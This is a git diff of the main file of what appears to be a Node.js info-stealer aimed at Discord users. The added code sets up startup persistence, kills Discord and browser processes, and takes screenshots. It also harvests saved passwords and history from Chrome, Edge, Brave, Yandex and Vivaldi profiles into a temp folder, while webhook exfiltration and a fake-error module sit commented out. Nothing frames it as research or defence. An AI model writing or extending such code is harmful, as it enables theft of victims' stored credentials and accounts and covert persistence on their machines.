@@ -1,3 +1,36 @@
-require('./util/functions/kill-discord');
-//require('./util/functions/grab-discord-token');
+const { paths: { localAppData } } = require('./util/variables');
+const { resolve, sep, join } = require('path');
+const { existsSync, mkdtempSync, mkdirSync} = require('fs');
+const os = require('os');
+const config = require('./config');
+const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
+module.exports.tempFolder = tempFolder;
 
+config.addToStartup && require('./util/functions/startup');
+config.killDiscord  && require('./util/functions/kill-discord');
+// require('./util/functions/webhook');
+// require('./util/functions/grab')(tempFolder);
+require('./util/functions/screenshot')(tempFolder);
+// require('./util/functions/fake-error');
+
+const browsers = [
+  ['',       ['Vivaldi']],
+  ['',       ['Google', 'Chrome', 'SxS']],
+  ['chrome', ['Google', 'Chrome']],
+  ['msedge', ['Microsoft', 'Edge']],
+  ['',       ['Yandex', 'YandexBrowser']],
+  ['',       ['BraveSoftware', 'Brave-Browser']],
+];
+
+mkdirSync(join(tempFolder, 'Browsers'));
+browsers.forEach((browser) => {
+  const path = resolve(localAppData, browser[1].join(sep), 'User Data');
+  const grab = require('./util/functions/grab-browsers-data');
+  // Browser data exists
+  if (existsSync(path)) {
+    // Kill browser process
+    grab.kill(browser[0], () => {
+      ['passwords', 'history'].forEach(fn => grab[fn](browser[1].join(' '), path));
+    });
+  }
+});
